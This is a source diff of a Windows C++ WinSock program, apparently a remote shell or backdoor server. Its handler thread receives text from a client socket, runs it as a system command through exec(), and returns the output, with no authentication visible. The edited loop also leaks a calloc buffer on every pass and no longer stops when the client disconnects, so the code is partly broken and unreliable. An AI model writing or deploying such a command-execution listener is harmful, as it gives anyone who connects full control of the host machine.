@@ -4,7 +4,7 @@
 #include <iostream>
 #include <WinSock2.h>
 #include <WS2tcpip.h>
-
+#include <string>
 #pragma comment (lib, "Ws2_32.lib")
 
 
@@ -23,29 +23,32 @@ string exec(char* cmd) {
 DWORD WINAPI cmd(LPVOID Socket) {
 
     SOCKET clientSock = (SOCKET)Socket;
-    char buff[1024];
     //send(clientSock,"hello from sever!!",sizeof("hello from sever!!"), 0);
-    while (true)
-    {
+    char* buffer;
+    DWORD byteRead = 0;
+
+    while (1) {
+
         int iRecv;
-        iRecv = recv(clientSock, buff, sizeof(buff), 0);
-        if (iRecv  > 0)
-        {
-            buff[iRecv] = '\0';
-            //cout << buff << endl;
-            string senBuff = exec(buff);
-            //cout << senBuff << endl;
-            int iSend;
-            int iSenderBuffer = senBuff.length();
-            iSend = send(clientSock, senBuff.c_str(), iSenderBuffer,0);
+        char* input = NULL;
+        input = (char*)calloc(BUFSIZ, sizeof(char));
 
+        iRecv = recv(clientSock, input, BUFSIZ, 0);
+        string buff = exec(input);
+        buffer = (char*)buff.c_str();
+        cout << buffer << endl;
+        byteRead = buff.length();
+        cout << byteRead << endl;
+        //send output size
+        int iSend = send(clientSock, (char*)&byteRead, sizeof(byteRead), 0);
+        //send output
+        if (byteRead != 0) {
+            int iSend = send(clientSock, buffer, byteRead, 0);
         }
-
-        else if (iRecv < 0)
-            break;
     }
     return 0;
 }
+
 
 DWORD WINAPI serve(LPVOID serverSocket) {
     SOCKET clientSocket;
@@ -129,8 +132,9 @@ int main()
     }
     DWORD serveThread;
     HANDLE hServeThread;
-    hServeThread=  CreateThread(NULL, 0, serve, (LPVOID)serverSocket, 0, &serveThread);
+    hServeThread = CreateThread(NULL, 0, serve, (LPVOID)serverSocket, 0, &serveThread);
     WaitForSingleObject(hServeThread, INFINITE);
+    
    
 }
 
